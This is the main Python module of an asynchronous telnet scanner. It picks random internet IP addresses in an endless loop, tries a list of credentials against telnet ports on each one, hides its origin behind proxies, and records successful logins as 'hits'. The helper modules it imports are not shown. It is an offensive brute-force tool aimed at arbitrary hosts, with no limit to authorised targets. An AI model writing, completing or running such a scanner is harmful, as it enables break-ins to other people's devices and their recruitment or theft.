#!/usr/bin/env python3
"""
Telnet Scanner - Main Application
An asynchronous network scanner that discovers and attempts to authenticate to telnet services
using credential lists and secure proxying.
"""
import asyncio
import argparse
import logging
import signal
import sys
import time
from datetime import datetime

from config import Config
from ip_generator import IPGenerator
from proxy_manager import ProxyManager
from auth_handler import AuthHandler
from utils import setup_logging, print_banner, StatTracker

# Global variables for graceful shutdown
running = True
tasks = []


async def process_batch(ip_batch, config, proxy_manager, auth_handler, stats):
    """Process a batch of IP addresses for telnet scanning."""
    semaphore = asyncio.Semaphore(config.max_conns)
    batch_tasks = []
    
    for ip in ip_batch:
        if not running:
            break
            
        for port in config.ports:
            task = asyncio.create_task(
                auth_handler.try_all_creds_for_target(
                    ip, port, semaphore, proxy_manager, stats
                )
            )
            batch_tasks.append(task)
            # Track tasks for graceful shutdown
            tasks.append(task)
    
    # Wait for all tasks to complete
    if batch_tasks:
        await asyncio.gather(*batch_tasks, return_exceptions=True)
        
    # Remove completed tasks from the global list
    for task in batch_tasks:
        if task in tasks:
            tasks.remove(task)


async def main():
    """Main execution function."""
    parser = argparse.ArgumentParser(description="Asynchronous Telnet Scanner")
    parser.add_argument("-c", "--config", help="Path to configuration file", default="config.ini")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose logging")
    parser.add_argument("-d", "--debug", action="store_true", help="Enable debug logging")
    parser.add_argument("--batch-size", type=int, help="IP batch size for scanning")
    parser.add_argument("--max-conns", type=int, help="Maximum concurrent connections")
    parser.add_argument("--creds", help="Path to credentials file")
    parser.add_argument("--hits", help="Path to save successful hits")
    parser.add_argument("--proxies", help="Path to proxy list file")
    args = parser.parse_args()

    # Initialize configuration
    config = Config(args)
    
    # Setup logging
    log_level = logging.DEBUG if args.debug else (logging.INFO if args.verbose else logging.WARNING)
    setup_logging(log_level)
    logger = logging.getLogger("TelnetScanner")
    
    # Display banner and configuration
    print_banner()
    logger.info(f"Started at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    logger.info(f"Configuration loaded from: {args.config}")
    logger.info(f"Batch Size: {config.ip_batch_size}, Max Connections: {config.max_conns}")
    logger.info(f"Scanning ports: {config.ports}")
    
    # Initialize components
    ip_generator = IPGenerator()
    proxy_manager = ProxyManager(config.proxy_list, int(config.connect_timeout))
    auth_handler = AuthHandler(
        config.creds_file, 
        config.hits_file, 
        int(config.login_timeout),
        config.retry_attempts
    )
    stats = StatTracker()
    
    # Verify proxy if using one
    await proxy_manager.initialize()
    logger.info(f"Using {len(proxy_manager.working_proxies)} working proxies or direct connections")
    # We'll continue even if no external proxies are available - direct connections will be used
    
    # Setup signal handlers for graceful shutdown
    def handle_shutdown(sig, frame):
        global running
        logger.warning(f"Received signal {sig}. Shutting down gracefully...")
        running = False
        
        # Cancel all running tasks
        for task in tasks:
            if not task.done():
                task.cancel()
    
    signal.signal(signal.SIGINT, handle_shutdown)
    signal.signal(signal.SIGTERM, handle_shutdown)
    
    # Main scan loop
    start_time = time.time()
    batch_count = 0
    
    try:
        while running:
            batch_count += 1
            ip_batch = ip_generator.get_random_ips(config.ip_batch_size)
            
            logger.info(f"Batch #{batch_count}: Scanning {len(ip_batch)} IPs across {len(config.ports)} ports...")
            
            await process_batch(ip_batch, config, proxy_manager, auth_handler, stats)
            
            # Print statistics
            elapsed = time.time() - start_time
            ips_per_second = (batch_count * config.ip_batch_size) / elapsed if elapsed > 0 else 0
            
            logger.info(f"Statistics - Scanned: {stats.scanned} | "
                       f"Attempts: {stats.attempts} | Hits: {stats.hits} | "
                       f"Speed: {ips_per_second:.2f} IPs/sec")
            
            # Small pause between batches to prevent overwhelming resources
            await asyncio.sleep(config.batch_delay)
            
    except asyncio.CancelledError:
        logger.info("Main task cancelled")
    except Exception as e:
        logger.exception(f"Unexpected error: {e}")
    finally:
        # Print final statistics
        elapsed = time.time() - start_time
        logger.info(f"\nScan completed in {elapsed:.2f} seconds")
        logger.info(f"Total statistics - Batches: {batch_count} | "
                   f"Scanned: {stats.scanned} | Attempts: {stats.attempts} | "
                   f"Hits: {stats.hits}")
        logger.info(f"Successful hits saved to: {config.hits_file}")


if __name__ == "__main__":
    asyncio.run(main())
